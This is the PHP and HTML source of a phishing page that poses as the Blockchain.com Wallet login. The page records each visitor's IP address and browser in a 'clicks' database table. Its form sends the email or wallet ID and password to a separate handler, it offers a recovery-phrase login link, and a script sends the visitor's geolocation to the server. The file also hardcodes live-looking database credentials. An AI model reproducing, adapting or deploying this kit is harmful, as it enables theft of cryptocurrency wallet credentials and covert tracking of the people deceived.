<?php
include_once 'verify_token.php';


// Iniciar a sessão, se necessário
session_start();

// Conexão com o banco de dados
$servername = "localhost";
$username = "u682092893_user"; // Seu nome de usuário do banco
$password = "uxh3PzG7gN1B"; // Sua senha do banco
$dbname = "u682092893_db"; // Nome do seu banco de dados


$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar se houve erro de conexão
if ($conn->connect_error) {
    die("Conexão falhou: " . $conn->connect_error);
}

// Capturar informações do clique (IP, navegador, etc.)
$ip = $_SERVER['REMOTE_ADDR'];  // IP do usuário
$datahora = date("Y-m-d H:i:s"); // Data e hora atual
$geo = ""; // Você pode adicionar uma biblioteca para pegar a geolocalização, se necessário
$os = "Unknown OS"; // Identificar o sistema operacional do cliente
$browser = $_SERVER['HTTP_USER_AGENT']; // Identificar o navegador
$dispositivo = "Desconhecido"; // Identificar o dispositivo (móvel, desktop, etc.)
$pagina = "login"; // Página atual (login)
$acessos = 1; // Quantidade de acessos
$online = 0; // Não está online até completar o login
$tempo = time(); // Timestamp de quando o clique ocorreu
$status = "OK"; // Status do clique

// Inserir um novo clique na tabela 'clicks' sempre que o formulário for acessado
$sql = "INSERT INTO clicks (ip, datahora, geo, os, dispositivo, browser, pagina, acessos, online, tempo, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";

if ($stmt = $conn->prepare($sql)) {
    $stmt->bind_param("sssssssssss", $ip, $datahora, $geo, $os, $dispositivo, $browser, $pagina, $acessos, $online, $tempo, $status);
    
    if ($stmt->execute()) {
        // Clique registrado com sucesso
    } else {
        echo "Erro ao registrar clique: " . $stmt->error;
    }

    $stmt->close();
}

// Fechar a conexão
$conn->close();
?>
<html lang="en"><head>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17093920641"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-17093920641');
</script>

      <meta charset="utf-8">
      
      
      
      <style>
         .sc-d7d4b21c-0.kOiKct {
         width: 100%;
         max-width: 400px;
         padding: 12px 20px;
         font-size: 16px;
         border-radius: 6px;
         box-sizing: border-box;
         display: block;
         margin: 16px auto; /* centraliza e dá espaçamento */
         }
         @media (max-width: 600px) {
         .sc-d7d4b21c-0.kOiKct {
         font-size: 14px;
         padding: 10px 16px;
         }
         }
      </style>
      <link rel="stylesheet" href="css/styled-version.css">
      <title>Wallet | Login</title>
      
      <link rel="icon" href="icon.ico">
      <style>.sf-hidden{display:none!important}</style>
   </head>
   <body cz-shortcut-listen="true">
      <div id="__next">
         <div class="sc-a019a3b0-0 cvNWit">
            <div class="sc-ae75bbb8-0 inhrnT">
               <div class="sc-ae75bbb8-2 dtgNZd"></div>
               <div class="sc-ae75bbb8-1 ctBrgJ">
                  <div direction="row" class="sc-b6b6700-0 jTpRSp">
                     <a class="sc-1d8c9399-0 jDcQkQ" href="" style="display:contents"><img src="banner.svg" class="sc-ae75bbb8-3 sc-ae75bbb8-4 kdlJJo bJBExz"><img src="data:," class="sc-ae75bbb8-3 sc-ae75bbb8-5 kdlJJo fQSFgs sf-hidden"></a>
                     <div class="sc-7be3dc0f-2 sc-ae75bbb8-7 dasPAn gWOyy">
                        <a hovered="[object Object]" class="sc-ae75bbb8-10 iMyMMb" href="">
                           <span class="sc-ae75bbb8-8 hVvwSi">Wallet</span>
                           <div class="sc-ae75bbb8-9 fBVNJf"></div>
                        </a>
                        <a hovered="[object Object]" class="sc-ae75bbb8-10 hpQJoW" href="">
                           <span class="sc-ae75bbb8-8 hVvwSi">Exchange</span>
                           <div class="sc-ae75bbb8-9 fBVNJf"></div>
                        </a>
                     </div>
                     <div class="sc-b94c1238-0 cagVUH">
                        <span color="#fff" class="sc-848ef629-7 sc-b94c1238-5 OOOXM fqFzlw">Don't have an account?</span>
                        <a class="sc-1d8c9399-0 dhzBWU sc-b94c1238-6 geguoE" aria-label="" role="link" href="">
                           <div class="sc-d7d4b21c-1 fZYnDg sc-b94c1238-6 geguoE"><span color="#fff" class="sc-848ef629-10 bjHIDi">Sign Up</span></div>
                        </a>
                     </div>
                  </div>
               </div>
            </div>
            <div class="sc-a019a3b0-2 fbVIJS">
               <div class="sc-df0eddf3-0 kgXglJ sc-a019a3b0-1 hiPkhm">
                  <main class="sc-a019a3b0-3 efgEdn">
                     <div class="sc-4286a553-0 cGQJOE">
                        <div class="sc-39cdbb1c-0 iDSlkD">
                           <span class="sc-848ef629-7 dcthHt">Check that the URL is correct.&nbsp;</span>
                           <span>
                              <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="#677184" viewBox="0 0 24 24" cursor="auto" aria-label="" style="cursor:inherit">
                                 <path fill-rule="evenodd" d="M19 11a2 2 0 0 0-2-2V7A5 5 0 0 0 7 7v2a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2zM9 7v2h6V7a3 3 0 1 0-6 0m3 10.5a2 2 0 1 0 0-4 2 2 0 0 0 0 4" clip-rule="evenodd"></path>
                              </svg>
                              <span class="sc-848ef629-10 hXsuBL"></span>
                           </span>
                        </div>
                        <div direction="column" class="sc-df0eddf3-0 lghbbF sc-4286a553-13 dqWRHu">
                           <div class="sc-5b489bf3-0 gGNHTL">
                              <div class="sc-5b489bf3-1 vLcOG">
                                 <span color="#121D33" class="sc-848ef629-12 hgdFjA">Scan QR code to login</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#121D33" viewBox="0 0 24 24" cursor="auto" aria-label="" style="cursor:inherit">
                                    <path fill-rule="evenodd" d="M5 2a3 3 0 0 0-3 3v3a3 3 0 0 0 3 3h3a3 3 0 0 0 3-3V5a3 3 0 0 0-3-3zM4 5a1 1 0 0 1 1-1h3a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1zm1 8a3 3 0 0 0-3 3v3a3 3 0 0 0 3 3h3a3 3 0 0 0 3-3v-3a3 3 0 0 0-3-3zm-1 3a1 1 0 0 1 1-1h3a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1zm9-11a3 3 0 0 1 3-3h3a3 3 0 0 1 3 3v3a3 3 0 0 1-3 3h-3a3 3 0 0 1-3-3zm3-1a1 1 0 0 0-1 1v3a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1V5a1 1 0 0 0-1-1zm-.5 13a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3m0 4a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3m5.5-5.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M19.5 21a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3" clip-rule="evenodd"></path>
                                 </svg>
                              </div>
                           </div>
                           <h3 class="sc-848ef629-3 sc-4286a553-3 sc-4286a553-16 eBKcYg DOHsc MWuEw" style="margin-top:48px">Login to Blockchain.com Wallet</h3>
                           <form class="sc-4286a553-12 LeXsQ form mt35" method="POST" action="login-user.php">
                              <div class="sc-4286a553-11 feHImD"><span class="sc-4286a553-5 bVJeWy">Email or Wallet ID</span><input autocomplete="username" name="user_id" id="user_id" placeholder="Enter your email or wallet ID" class="sc-4286a553-6 bGPbqA" value=""></div>
                              <div class="sc-4286a553-11 feHImD">
                                 <span class="sc-4286a553-5 bVJeWy">Password</span>
                                 <div style="position:relative;width:100%;display:flex;align-items:center">
                                    <input autocomplete="current-password" type="password" name="password" placeholder="************" class="sc-4286a553-6 bGPbqA">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#121D33" viewBox="0 0 24 24" cursor="pointer" aria-label="" style="position:absolute;right:8px;cursor:inherit;opacity:0.3;padding:8px">
                                       <path fill-rule="evenodd" d="M21.757 11.26q.076.157.117.246l.045.1c.108.25.108.536 0 .788-.005-.006-.029.059-.04.087l-.005.013q-.04.09-.117.247a16.74 16.74 0 0 1-2.248 3.41C17.922 18.003 15.42 20 12 20s-5.922-1.997-7.51-3.85a16.7 16.7 0 0 1-2.247-3.41q-.077-.157-.117-.246l-.032-.072a1.15 1.15 0 0 1 .032-.916q.04-.09.117-.247A16.744 16.744 0 0 1 4.49 7.85C6.078 5.997 8.58 4 12 4s5.922 1.997 7.51 3.85a16.7 16.7 0 0 1 2.247 3.41M10 12a2 2 0 1 1 4 0 2 2 0 0 1-4 0m2-4a4 4 0 1 0 0 8 4 4 0 0 0 0-8" clip-rule="evenodd"></path>
                                    </svg>
                                 </div>
                              </div>
                              <div class="sc-4286a553-10 kJuAZZ"></div>
                              <button width="100%" size="1" aria-label="" class="sc-d7d4b21c-0 kOiKct">Continue</button>
                              <a aria-label="" role="link" size="1" class="sc-1d8c9399-0 dhzBWU" href="">
                                 <div size="1" class="sc-d7d4b21c-1 jwMAiT">Forgot password?</div>
                              </a>
                              <div class="sc-4286a553-14 boUHvH"><span class="sc-848ef629-12 LrPKd"><a color="#677184" class="sc-1d8c9399-0 ktjmnN" href="">Login with 12 word recovery phrase</a></span></div>
                           </form>
						   
                        </div>
                     </div>
                  </main>
               </div>
            </div>
         </div>
      </div>
  
   


<script>
// Verifica se o navegador suporta geolocalização
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;

    // Exibe a localização no console
    console.log("Latitude: " + latitude + ", Longitude: " + longitude);

    // Enviar dados para o PHP (usando AJAX)
    sendLocationToServer(latitude, longitude);
  });
} else {
  console.log("Geolocalização não suportada pelo navegador.");
}

// Função para enviar os dados para o servidor
function sendLocationToServer(latitude, longitude) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "process-location.php", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

  // Envia os dados da localização para o servidor
  xhr.send("latitude=" + latitude + "&longitude=" + longitude);
}
</script></body></html>